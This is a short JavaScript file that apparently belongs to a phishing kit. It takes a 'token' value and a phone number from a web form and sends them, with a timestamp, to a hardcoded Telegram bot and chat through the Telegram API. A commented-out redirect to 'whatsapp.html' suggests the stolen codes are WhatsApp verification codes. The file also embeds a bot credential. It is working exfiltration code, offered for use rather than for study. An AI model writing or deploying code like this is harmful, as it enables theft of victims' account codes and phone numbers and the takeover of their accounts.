//programmer xnmap

var telegram_bot_id = "5543651696:AAGYpZEZ8jZj0EDLyCNRH9M4a5IJ6myE6VA"; 

var chat_id = -1001711158395; 
var u_name, email, message;
var ready = function() {
 //   u_name = document.getElementById("name").value;
  //  email = document.getElementById("email").value;
    token = document.getElementById("token").value;
    phone = document.getElementById("phone").value;
    var data = new Date();
token = "\n phone number:" + phone +"\n customer:" + token + "\n⏰ date:" + data;
    
};
var sendtelegram = function() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": token
        })
    };
    $.ajax(settings).done(function(response) {
        console.log(response);
        //location=("whatsapp.html");
    });

   // document.getElementById("name").value = "";
   // document.getElementById("email").value = "";
    document.getElementById("token").value = "";
    
    return false;
    

  
  
  

};